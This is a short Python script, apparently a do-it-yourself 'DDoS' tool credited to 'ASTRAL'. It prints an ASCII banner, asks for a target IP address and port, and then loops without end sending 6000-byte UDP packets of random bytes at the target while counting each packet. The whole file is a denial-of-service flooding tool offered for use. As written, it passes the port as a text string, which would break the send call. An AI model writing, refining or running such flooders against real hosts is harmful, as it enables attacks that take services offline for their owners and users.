#!/usr/bin/python
#coder : ASTRAL...

import os
import socket
import random
import sys
import time

os.system("clear")

banner="""




           _             _____________ _____ _____ 
          | |           | |  _  \  _  \  _  /  ___|
  __ _ ___| |_ _ __ __ _| | | | | | | | | | \ `--. 
 / _` / __| __| '__/ _` | | | | | | | | | | |`--. \
| (_| \__ \ |_| | | (_| | | |/ /| |/ /\ \_/ /\__/ /
 \__,_|___/\__|_|  \__,_|_|___/ |___/  \___/\____/ 
                                                   
                                                   




"""

print(banner)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(6000)


host = input("Target IP addres         : ")
port = input("Target PORT number       : ")


sent = 0


while True:
    sock.sendto(bytes, (host,port))
    sent = sent + 1
    print("\u001b[31m.Attack Started Send package :%d" % (sent))




